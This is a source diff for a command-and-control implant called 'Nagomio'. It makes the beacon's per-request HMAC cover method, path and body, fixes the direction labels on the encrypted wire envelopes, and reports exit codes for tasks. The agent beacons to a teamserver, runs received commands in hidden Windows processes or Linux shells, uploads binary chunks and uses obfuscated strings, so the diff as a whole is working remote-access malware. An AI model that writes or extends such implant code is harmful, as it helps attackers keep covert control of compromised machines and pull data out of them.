@@ -575,11 +575,9 @@ std::string wide_to_utf8(const std::wstring& value) {
 }
 #endif
 
-// A4: per-request HMAC. The agent signs `agent_id\n<ts>\n<nonce>` with
-// HMAC-SHA256 and sends the result in `x-nagomio-ts`, `x-nagomio-mac`,
-// and `x-nagomio-nonce` headers. The nonce ensures uniqueness when
-// multiple HMACs are produced within the same second (e.g. a beacon
-// followed by its response).
+// A4: per-request HMAC over the canonical request:
+//   v1\nMETHOD\nPATH\nQUERY\nPRINCIPAL\nTS\nNONCE\nBODY_SHA256_HEX
+// Headers: x-nagomio-ts / x-nagomio-mac / x-nagomio-nonce.
 struct AuthHeaders {
     std::string timestamp;
     std::string nonce;
@@ -598,28 +596,56 @@ static std::string to_hex(const unsigned char* data, size_t len) {
 }
 
 #ifdef _WIN32
-static AuthHeaders compute_auth_headers(const std::string& agent_id, const std::string& psk) {
+#include <mutex>
+static std::string sha256_hex_bytes(const unsigned char* data, size_t len) {
+    BCRYPT_ALG_HANDLE alg = nullptr;
+    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, nullptr, 0))) {
+        return std::string(64, '0');
+    }
+    BCRYPT_HASH_HANDLE hh = nullptr;
+    std::vector<unsigned char> hash(32);
+    if (!BCRYPT_SUCCESS(BCryptCreateHash(alg, &hh, nullptr, 0, nullptr, 0, 0))) {
+        BCryptCloseAlgorithmProvider(alg, 0);
+        return std::string(64, '0');
+    }
+    BCryptHashData(hh, const_cast<unsigned char*>(data), (ULONG)len, 0);
+    BCryptFinishHash(hh, hash.data(), (ULONG)hash.size(), 0);
+    BCryptDestroyHash(hh);
+    BCryptCloseAlgorithmProvider(alg, 0);
+    return to_hex(hash.data(), hash.size());
+}
+
+static AuthHeaders compute_auth_headers(const std::string& agent_id,
+                                        const std::string& psk,
+                                        const std::string& method,
+                                        const std::string& path,
+                                        const std::string& query,
+                                        const std::string& body) {
     AuthHeaders out;
     long long ts = (long long)time(nullptr);
-    // Per-call nonce so the same second can produce many distinct HMACs.
-    // 16 hex chars = 64 bits of entropy, plenty.
+    // Shared RNG is used by beacon + stream threads; protect it.
+    static std::mutex rng_mu;
     static std::random_device rd;
     static std::mt19937_64 gen(rd());
-    uint64_t n = gen();
+    uint64_t n = 0;
+    {
+        std::lock_guard<std::mutex> lock(rng_mu);
+        n = gen();
+    }
     char nbuf[20];
     std::snprintf(nbuf, sizeof(nbuf), "%016llx", (unsigned long long)n);
     out.timestamp = std::to_string(ts);
     out.nonce = nbuf;
-    std::string msg = agent_id + "\n" + out.timestamp + "\n" + out.nonce;
-    // Compute HMAC-SHA256 using BCrypt.
+    std::string body_hash = sha256_hex_bytes(
+        reinterpret_cast<const unsigned char*>(body.data()), body.size());
+    std::string msg = std::string("v1\n") + method + "\n" + path + "\n" + query + "\n" +
+                      agent_id + "\n" + out.timestamp + "\n" + out.nonce + "\n" + body_hash;
     BCRYPT_ALG_HANDLE alg = nullptr;
     if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, nullptr, 0))) {
         return out;
     }
-    // ipad/opad HMAC
     std::vector<unsigned char> key(psk.begin(), psk.end());
     if (key.size() > 64) {
-        // Hash the key first.
         std::vector<unsigned char> h(32);
         BCRYPT_HASH_HANDLE hh = nullptr;
         BCryptCreateHash(alg, &hh, nullptr, 0, nullptr, 0, 0);
@@ -659,8 +685,14 @@ static AuthHeaders compute_auth_headers(const std::string& agent_id, const std::
 }
 #else
 #include <openssl/hmac.h>
+#include <openssl/sha.h>
 #include <random>
-static AuthHeaders compute_auth_headers(const std::string& agent_id, const std::string& psk) {
+static AuthHeaders compute_auth_headers(const std::string& agent_id,
+                                        const std::string& psk,
+                                        const std::string& method,
+                                        const std::string& path,
+                                        const std::string& query,
+                                        const std::string& body) {
     AuthHeaders out;
     long long ts = (long long)time(nullptr);
     static thread_local std::random_device rd;
@@ -670,7 +702,11 @@ static AuthHeaders compute_auth_headers(const std::string& agent_id, const std::
     std::snprintf(nbuf, sizeof(nbuf), "%016llx", (unsigned long long)n);
     out.timestamp = std::to_string(ts);
     out.nonce = nbuf;
-    std::string msg = agent_id + "\n" + out.timestamp + "\n" + out.nonce;
+    unsigned char body_digest[SHA256_DIGEST_LENGTH];
+    SHA256(reinterpret_cast<const unsigned char*>(body.data()), body.size(), body_digest);
+    std::string body_hash = to_hex(body_digest, SHA256_DIGEST_LENGTH);
+    std::string msg = std::string("v1\n") + method + "\n" + path + "\n" + query + "\n" +
+                      agent_id + "\n" + out.timestamp + "\n" + out.nonce + "\n" + body_hash;
     unsigned char mac[EVP_MAX_MD_SIZE];
     unsigned int mac_len = 0;
     HMAC(EVP_sha256(),
@@ -792,8 +828,9 @@ HttpPostResult http_request_windows(const AgentConfig& config,
 
     std::wstring headers = L"Content-Type: application/json\r\n";
     if (!config.agent_token.empty()) {
-        // A4: per-request HMAC. The principal in the HMAC is the agent_id.
-        auto auth = compute_auth_headers(config.agent_id, config.agent_token);
+        // A4: per-request HMAC binds method, path, and body.
+        auto auth = compute_auth_headers(config.agent_id, config.agent_token,
+                                         method, endpoint, "", body);
         headers += L"x-nagomio-ts: ";
         headers += utf8_to_wide(auth.timestamp);
         headers += L"\r\n";
@@ -915,7 +952,9 @@ HttpPostResult post_binary_windows(const AgentConfig& config, const std::string&
 
     std::wstring headers = L"Content-Type: application/octet-stream\r\n";
     if (!config.agent_token.empty()) {
-        auto auth = compute_auth_headers(config.agent_id, config.agent_token);
+        std::string body_str(body.begin(), body.end());
+        auto auth = compute_auth_headers(config.agent_id, config.agent_token,
+                                         "POST", endpoint, "", body_str);
         headers += L"x-nagomio-ts: ";
         headers += utf8_to_wide(auth.timestamp);
         headers += L"\r\n";
@@ -1095,6 +1134,7 @@ void append_truncation_notice(std::string& output, bool truncated) {
 struct CommandExecutionResult {
     std::string output;
     bool timed_out = false;
+    int exit_code = 0;
 };
 
 #ifdef _WIN32
@@ -1197,6 +1237,8 @@ CommandExecutionResult exec_hidden_windows(const char* cmd, int timeout_seconds)
         append_capped(result, buffer.data(), bytes_read, truncated);
     }
 
+    DWORD exit_code = 0;
+    GetExitCodeProcess(process_info.hProcess, &exit_code);
     CloseHandle(process_info.hProcess);
     CloseHandle(process_info.hThread);
     CloseHandle(read_pipe);
@@ -1204,7 +1246,7 @@ CommandExecutionResult exec_hidden_windows(const char* cmd, int timeout_seconds)
         result += "\n[task timed out]";
     }
     append_truncation_notice(result, truncated);
-    return {result, timed_out};
+    return {result, timed_out, static_cast<int>(exit_code)};
 }
 #else
 CommandExecutionResult exec_shell_linux(const char* cmd, int timeout_seconds) {
@@ -1247,6 +1289,7 @@ CommandExecutionResult exec_shell_linux(const char* cmd, int timeout_seconds) {
     bool truncated = false;
     bool timed_out = false;
     bool child_done = false;
+    int exit_code = -1;
     auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(timeout_seconds);
 
     while (true) {
@@ -1259,6 +1302,11 @@ CommandExecutionResult exec_shell_linux(const char* cmd, int timeout_seconds) {
         pid_t wait_result = waitpid(pid, &status, WNOHANG);
         if (wait_result == pid) {
             child_done = true;
+            if (WIFEXITED(status)) {
+                exit_code = WEXITSTATUS(status);
+            } else if (WIFSIGNALED(status)) {
+                exit_code = 128 + WTERMSIG(status);
+            }
         }
 
         if (child_done && bytes_read == 0) {
@@ -1268,7 +1316,9 @@ CommandExecutionResult exec_shell_linux(const char* cmd, int timeout_seconds) {
         if (std::chrono::steady_clock::now() >= deadline) {
             timed_out = true;
             kill(-pid, SIGKILL);
-            waitpid(pid, nullptr, 0);
+            int st = 0;
+            waitpid(pid, &st, 0);
+            exit_code = 124;
             break;
         }
 
@@ -1292,7 +1342,7 @@ CommandExecutionResult exec_shell_linux(const char* cmd, int timeout_seconds) {
         result += "\n[task timed out]";
     }
     append_truncation_notice(result, truncated);
-    return {result, timed_out};
+    return {result, timed_out, exit_code};
 }
 #endif
 
@@ -1530,13 +1580,6 @@ static httplib::Client* cli_for_thread() { return agent_runtime_ctx().cli; }
 static httplib::Headers headers_for_thread() {
     httplib::Headers h;
     const auto& cfg = agent_runtime_ctx().config;
-    const auto& rg = agent_runtime_ctx().reg;
-    if (!cfg.agent_token.empty()) {
-        auto auth = compute_auth_headers(rg.agent_id, cfg.agent_token);
-        h.emplace(OBFSTR("x-nagomio-ts"), auth.timestamp);
-        h.emplace(OBFSTR("x-nagomio-nonce"), auth.nonce);
-        h.emplace(OBFSTR("x-nagomio-mac"), auth.mac);
-    }
     h.emplace(OBFSTR("User-Agent"), cfg.user_agent);
     return h;
 }
@@ -1556,19 +1599,21 @@ static void send_agent_response(const Nagomio::AgentResponse& agent_res,
 #if NAGOMIO_WIRE_ENCRYPTION
     if (!config.agent_token.empty()) {
         std::vector<unsigned char> nonce, ct, tag;
-        nagomio_wire::seal(config.agent_token, "nagomio/server/v1",
+        // Agent -> server always uses the agent direction context.
+        nagomio_wire::seal(config.agent_token, "nagomio/agent/v1",
                            std::vector<unsigned char>(res_body.begin(), res_body.end()),
                            nonce, ct, tag);
-        res_body = nagomio_wire::encode_envelope("nagomio/server/v1", nonce, ct, tag);
+        res_body = nagomio_wire::encode_envelope("nagomio/agent/v1", nonce, ct, tag);
     }
 #endif
 #ifndef _WIN32
     httplib::Headers res_headers = headers;
+    res_headers.erase(OBFSTR("x-nagomio-ts"));
+    res_headers.erase(OBFSTR("x-nagomio-nonce"));
+    res_headers.erase(OBFSTR("x-nagomio-mac"));
     if (!config.agent_token.empty()) {
-        auto auth = compute_auth_headers(reg.agent_id, config.agent_token);
-        res_headers.erase(OBFSTR("x-nagomio-ts"));
-        res_headers.erase(OBFSTR("x-nagomio-nonce"));
-        res_headers.erase(OBFSTR("x-nagomio-mac"));
+        auto auth = compute_auth_headers(reg.agent_id, config.agent_token,
+                                         "POST", nagomio::response_path(), "", res_body);
         res_headers.emplace(OBFSTR("x-nagomio-ts"), auth.timestamp);
         res_headers.emplace(OBFSTR("x-nagomio-nonce"), auth.nonce);
         res_headers.emplace(OBFSTR("x-nagomio-mac"), auth.mac);
@@ -1683,7 +1728,14 @@ Nagomio::AgentResponse execute_task(const Nagomio::Task& task, const std::string
         std::string command_line = build_command_line(task);
         CommandExecutionResult execution = exec(command_line.c_str(), timeout_seconds);
         agent_res.output = execution.output;
-        agent_res.status = execution.timed_out ? OBFSTR("error") : OBFSTR("success");
+        if (execution.timed_out || execution.exit_code != 0) {
+            agent_res.status = OBFSTR("error");
+            if (!execution.timed_out && execution.exit_code != 0) {
+                agent_res.output += "\n[exit code " + std::to_string(execution.exit_code) + "]";
+            }
+        } else {
+            agent_res.status = OBFSTR("success");
+        }
     } catch (const std::exception& e) {
         agent_res.output = e.what();
         agent_res.status = OBFSTR("error");
@@ -1750,7 +1802,22 @@ ChunkPostResult post_binary(const std::string& endpoint, const std::vector<unsig
         result.error = "no upload context";
         return result;
     }
-    auto r = ::post_binary(*ctx.cli, *ctx.headers, endpoint, body);
+    // Fresh HMAC per chunk: bind method, stream path, and binary body.
+    httplib::Headers headers = *ctx.headers;
+    headers.erase(OBFSTR("x-nagomio-ts"));
+    headers.erase(OBFSTR("x-nagomio-nonce"));
+    headers.erase(OBFSTR("x-nagomio-mac"));
+    const auto& cfg = config_for_thread();
+    const auto& rg = reg_for_thread();
+    if (!cfg.agent_token.empty()) {
+        std::string body_str(body.begin(), body.end());
+        auto auth = compute_auth_headers(rg.agent_id, cfg.agent_token,
+                                         "POST", endpoint, "", body_str);
+        headers.emplace(OBFSTR("x-nagomio-ts"), auth.timestamp);
+        headers.emplace(OBFSTR("x-nagomio-nonce"), auth.nonce);
+        headers.emplace(OBFSTR("x-nagomio-mac"), auth.mac);
+    }
+    auto r = ::post_binary(*ctx.cli, headers, endpoint, body);
     result.ok = r.transport_ok;
     result.status = r.status;
     result.body = r.body;
@@ -1838,15 +1905,7 @@ int main(int argc, char** argv) {
 #endif
 
     while (true) {
-        // A4: per-request HMAC. Compute fresh on each loop iteration so
-        // the teamserver's replay cache accepts every beacon.
         headers.clear();
-        if (!config.agent_token.empty()) {
-            auto auth = compute_auth_headers(reg.agent_id, config.agent_token);
-            headers.emplace(OBFSTR("x-nagomio-ts"), auth.timestamp);
-            headers.emplace(OBFSTR("x-nagomio-nonce"), auth.nonce);
-            headers.emplace(OBFSTR("x-nagomio-mac"), auth.mac);
-        }
 #ifndef _WIN32
         headers.emplace(OBFSTR("User-Agent"), ua);
 #endif
@@ -1870,21 +1929,31 @@ int main(int argc, char** argv) {
         // path. The body is irrelevant on a GET so we leave it empty when
         // the body is going to be discarded by the server anyway.
         std::string beacon_path = nagomio::beacon_path();
-        if (nagomio::beacon_method() == "GET") {
+        std::string beacon_method = nagomio::beacon_method();
+        if (beacon_method == "GET") {
             beacon_path += "/" + reg.agent_id;
             beacon_body.clear();
         }
 
+        // A4: HMAC over the finalized body and the actual request path.
+        if (!config.agent_token.empty()) {
+            auto auth = compute_auth_headers(reg.agent_id, config.agent_token,
+                                             beacon_method, beacon_path, "", beacon_body);
+            headers.emplace(OBFSTR("x-nagomio-ts"), auth.timestamp);
+            headers.emplace(OBFSTR("x-nagomio-nonce"), auth.nonce);
+            headers.emplace(OBFSTR("x-nagomio-mac"), auth.mac);
+        }
+
 #ifdef _WIN32
         HttpPostResult res;
-        if (nagomio::beacon_method() == "GET") {
+        if (beacon_method == "GET") {
             res = get_json_windows(config, beacon_path);
         } else {
             res = post_json_windows(config, beacon_path, beacon_body);
         }
 #else
         HttpPostResult res;
-        if (nagomio::beacon_method() == "GET") {
+        if (beacon_method == "GET") {
             res = get_path(cli, headers, beacon_path);
         } else {
             res = post_json(cli, headers, beacon_path, beacon_body);
@@ -1892,12 +1961,15 @@ int main(int argc, char** argv) {
 #endif
         if (res.transport_ok) {
             std::string inner = res.body;
-            // B1: open the wire envelope.
+            // B1: open the wire envelope (server -> agent uses server ctx).
 #if NAGOMIO_WIRE_ENCRYPTION
             if (!config.agent_token.empty()) {
                 std::string ctx;
                 std::vector<unsigned char> nonce, ct, tag;
                 if (nagomio_wire::try_decode_envelope(inner, ctx, nonce, ct, tag)) {
+                    if (ctx != "nagomio/server/v1") {
+                        std::cerr << "[-] Unexpected wire context on beacon response: " << ctx << std::endl;
+                    }
                     std::vector<unsigned char> plain;
                     if (!nagomio_wire::open(config.agent_token, ctx, nonce, ct, tag, plain)) {
                         std::cerr << "[-] Wire envelope tag mismatch on beacon response" << std::endl;
@@ -1929,21 +2001,20 @@ int main(int argc, char** argv) {
 #if NAGOMIO_WIRE_ENCRYPTION
                         if (!config.agent_token.empty()) {
                             std::vector<unsigned char> nonce, ct, tag;
-                            nagomio_wire::seal(config.agent_token, "nagomio/server/v1",
+                            nagomio_wire::seal(config.agent_token, "nagomio/agent/v1",
                                                std::vector<unsigned char>(res_body.begin(), res_body.end()),
                                                nonce, ct, tag);
-                            res_body = nagomio_wire::encode_envelope("nagomio/server/v1", nonce, ct, tag);
+                            res_body = nagomio_wire::encode_envelope("nagomio/agent/v1", nonce, ct, tag);
                         }
 #endif
-                        // A4: the response needs its own fresh HMAC since the
-                        // teamserver's replay cache would otherwise reject
-                        // the second request as a replay of the beacon.
+                        // A4: fresh HMAC for the response body and path.
                         httplib::Headers res_headers = headers;
+                        res_headers.erase(OBFSTR("x-nagomio-ts"));
+                        res_headers.erase(OBFSTR("x-nagomio-nonce"));
+                        res_headers.erase(OBFSTR("x-nagomio-mac"));
                         if (!config.agent_token.empty()) {
-                            auto auth = compute_auth_headers(reg.agent_id, config.agent_token);
-                            res_headers.erase(OBFSTR("x-nagomio-ts"));
-                            res_headers.erase(OBFSTR("x-nagomio-nonce"));
-                            res_headers.erase(OBFSTR("x-nagomio-mac"));
+                            auto auth = compute_auth_headers(reg.agent_id, config.agent_token,
+                                                             "POST", nagomio::response_path(), "", res_body);
                             res_headers.emplace(OBFSTR("x-nagomio-ts"), auth.timestamp);
                             res_headers.emplace(OBFSTR("x-nagomio-nonce"), auth.nonce);
                             res_headers.emplace(OBFSTR("x-nagomio-mac"), auth.mac);
